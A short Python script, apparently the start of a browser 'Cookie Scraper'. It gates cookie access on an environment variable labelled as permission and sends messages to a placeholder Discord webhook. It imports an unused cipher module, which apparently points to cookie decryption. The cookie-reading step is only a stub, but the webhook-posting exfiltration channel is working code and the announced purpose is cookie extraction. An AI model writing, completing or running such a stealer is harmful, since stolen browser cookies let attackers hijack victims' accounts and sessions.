import os
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Your Webhook URL
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"

# Check if the environment variable ALLOW_COOKIES_ACCESS exists and is set to "yes"
def ask_permission(permission):
    # Get environment variable 'ALLOW_COOKIES_ACCESS' (default is 'no' if not set)
    user_input = os.getenv("ALLOW_COOKIES_ACCESS", "no").strip().lower()
    
    if user_input == "yes":
        return True
    else:
        return False

def access_cookies():
    if ask_permission("cookies from your browser"):
        print("Accessing cookies...")
        # Logic to access cookies here
        # For example, code to access stored cookies from browser
    else:
        print("Permission denied to access cookies.")
        # Handle the case where permission is denied

# Example function to send data to the Discord webhook
def send_to_discord(message):
    data = {
        "content": message,
        "username": "Cookie Scraper",
        "avatar_url": "https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png"
    }
    response = requests.post(WEBHOOK_URL, json=data)
    if response.status_code == 204:
        print("Message successfully sent to Discord.")
    else:
        print(f"Failed to send message: {response.status_code}")

# Main function to initiate the process
def main():
    access_cookies()
    
    # Send a test message to the Discord webhook
    send_to_discord("Cookie extraction started!")

if __name__ == "__main__":
    main()
